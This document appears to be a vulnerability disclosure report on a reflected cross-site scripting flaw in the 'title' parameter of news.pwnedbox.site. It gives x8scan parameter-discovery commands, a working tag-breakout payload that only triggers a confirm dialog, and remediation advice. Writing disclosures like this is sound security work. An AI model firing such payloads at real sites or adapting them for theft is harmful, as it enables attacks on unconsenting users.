## Title
Reflected XSS - news.pwnedbox.site

## Description
The `title` GET parameter on `news.pwnedbox.site` was identified using the `x8scan` tool and found vulnerable to Reflected Cross-Site Scripting (XSS). A crafted HTML context-breakout payload successfully executed JavaScript and triggered a `confirm(1)` dialog in the browser.

## Steps to Reproduce

1. Open a terminal and execute the following command to discover GET parameters:

   ```bash
   echo "https://news.pwnedbox.site/" | x8scan -w params.txt
   ```

2. Observe the transformed GET URL generated by `x8scan`:

   ```text
   https://news.pwnedbox.site/?fname=x8scan1&lname=x8scan2&title=x8scan3
   ```

3. Open the following crafted URL in a browser:

   ```text
   https://news.pwnedbox.site/?title=%27%22%3C!--%3E%3C/Title%3E%3C/Text%20area%3E%3C/Script%3E%3C/Iframe%3E%3CDetails/Open/OnToggle%3D(confirm)(1)-->
   ```

4. Allow the page to load.

5. Observe the JavaScript confirmation dialog displaying `1`, confirming successful JavaScript execution.

6. Dismiss the confirmation dialog.

## POC (Proof of Concept)

**Target URL:**  
https://news.pwnedbox.site/

**HTTP Method:** GET

**Tool Used:** x8scan

**Command Used:**
```bash
echo "https://news.pwnedbox.site/" | x8scan -w params.txt
```

**Discovered Parameters:** `fname`, `lname`, `title`

**Transformed URL:**
```text
https://news.pwnedbox.site/?fname=x8scan1&lname=x8scan2&title=x8scan3
```

**Vulnerable Parameter:** `title`

**Payload:**
```html
'"<!--></Title></Text area></Script></Iframe><Details/Open/OnToggle=(confirm)(1)-->
```

**Crafted Request URL:**
```text
https://news.pwnedbox.site/?title=%27%22%3C!--%3E%3C/Title%3E%3C/Text%20area%3E%3C/Script%3E%3C/Iframe%3E%3CDetails/Open/OnToggle%3D(confirm)(1)-->
```

**Observed Result:**

The crafted payload was successfully executed through the `title` parameter. The browser displayed a JavaScript confirmation dialog containing `1`, confirming Reflected Cross-Site Scripting (XSS).

## Impact

- An attacker can craft a malicious URL and trick victims into opening it.
- Successful exploitation allows JavaScript execution in the victim's browser.
- The vulnerability may be abused for phishing or manipulation of displayed webpage content.

## Remediation

- Apply context-aware output encoding to the `title` parameter before rendering its value in HTML.
- Sanitize user-controlled input and prevent injection of executable HTML attributes and event handlers.
- Implement a restrictive Content Security Policy (CSP) to block inline JavaScript execution.
